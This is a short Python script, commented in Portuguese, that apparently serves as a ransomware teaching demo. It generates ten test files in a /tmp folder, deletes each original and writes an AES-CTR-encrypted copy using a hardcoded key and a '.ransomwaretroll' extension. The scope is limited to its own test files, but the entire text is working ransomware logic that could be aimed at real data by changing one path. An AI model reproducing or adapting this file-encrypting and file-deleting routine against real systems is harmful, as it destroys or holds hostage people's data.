import os
import pyaes

# pasta com os arquivos a serem criptografados
folder_name = "/tmp/ransonware"

# verificar se o diretorio existe. 
if not os.path.exists(folder_name):     
	os.makedirs(folder_name) # se o diretorio nao existe o mesmo é criado.

# criando os arquivos para serem criptografados
for file in range(10):
	file_str = str(file)

	file_path = folder_name + "/teste-" + file_str + ".txt"

	if not os.path.exists(file_path):
	    with open(file_path, 'w') as file:
	        file.write("Arquivo de teste descriptografado - " + file_str)
	else:
	    print("O Arquivo - " + file_path + " - já existe")

# percorrendo a pasta com os arquivos para criptografar
for filename in os.listdir(folder_name):
    f = os.path.join(folder_name, filename)
	# verifica se é um arquivo e realiza a criptografia
    if os.path.isfile(f):
        # abrir o arquivo a ser criptografado
        file_name = f
        file = open(file_name, "rb")
        file_data = file.read()
        file.close()

        # remover o arquivo
        os.remove(file_name)

        # chave de criptografia
        key = b"testeransomwares"
        aes = pyaes.AESModeOfOperationCTR(key)

        # criptografar o arquivo
        crypto_data = aes.encrypt(file_data)

        # salvar o arquivo criptografado
        new_file = file_name + ".ransomwaretroll"
        new_file = open(f'{new_file}', 'wb')
        new_file.write(crypto_data)
        new_file.close()